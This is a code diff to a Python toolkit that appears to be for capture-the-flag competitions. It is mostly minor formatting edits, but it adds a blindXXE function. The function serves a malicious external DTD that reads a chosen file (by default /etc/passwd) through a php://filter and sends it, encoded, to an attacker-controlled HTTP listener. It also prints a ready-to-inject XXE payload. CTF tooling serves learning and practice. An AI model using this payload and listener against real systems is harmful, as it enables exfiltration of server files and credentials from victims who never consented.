@@ -22,7 +22,7 @@ from ctfbox.exceptions import (FlaskSessionHelperError, GeneratePayloadError,
                                HashAuthArgumentError, HttprawError,
                                ProvideArgumentError, ScanError)
 from ctfbox.thirdparty.phpserialize import serialize
-from ctfbox.utils import Context, ProvideHandler, Threader, random_string
+from ctfbox.utils import Context, ProvideHandler, BlindXXEHandler, Threader, random_string
 
 
 class HashType(Enum):
@@ -291,7 +291,7 @@ def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,
         raise ProvideArgumentError("files type must be list")
     handler = partial(ProvideHandler, files)
     server = HTTPServer((host, port), handler)
-    print(f"Listen on {host}: {port} ...")
+    print(f"Listen on {host}:{port} ...")
     if isasync:
         t = Thread(target=server.serve_forever)
         t.start()
@@ -589,7 +589,8 @@ def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = 
     elif diff_len < 0:
         return php_serialize_escape_l2s(src, dst, payload, paddingTrush)
     else:
-        raise GeneratePayloadError("The length of dst cannot be the same as src")
+        raise GeneratePayloadError(
+            "The length of dst cannot be the same as src")
 
 
 def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
@@ -937,3 +938,46 @@ class OOB():
             str: prepared url
         """
         return f"http://{data}.{self.domain}"
+
+
+def blindXXE(host: str = "0.0.0.0", port: int = 2021, isasync: bool = False):
+    """Build a server for blind xxe.
+    It will generate payload and wait for receive file contents.
+
+    Note:
+        the payload like http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2].
+        argument file(optional) is the path of the file you want to read. Defaults to "/etc/passwd".
+        argument bz2(optional) is whether to use bz2 compress.
+
+    Args:
+        host (str, optional): host that the victim can access. Defaults to "0.0.0.0".
+        port (int, optional): listening port. Defaults to 2021.
+        isasync (bool, optional): Whether is async. Defaults to False.
+    """
+    content = f"""<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=!readFile!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
+%hack;""".encode()
+    bz2content = f"""<!ENTITY % payload SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource=!readFile!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/bz2?%payload;'>">
+%hack;""".encode()
+    handler = partial(BlindXXEHandler, content, bz2content)
+    server = HTTPServer(("0.0.0.0", port), handler)
+    print(f"Listen on 0.0.0.0:{port} ...")
+    print(f"""Payload is:\n\n<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]">
+%remote;
+%go;
+]>
+
+<root></root>
+""")
+    if isasync:
+        t = Thread(target=server.serve_forever)
+        t.start()
+    else:
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            print('[#] KeyboardInterrupt')
+            server.shutdown()
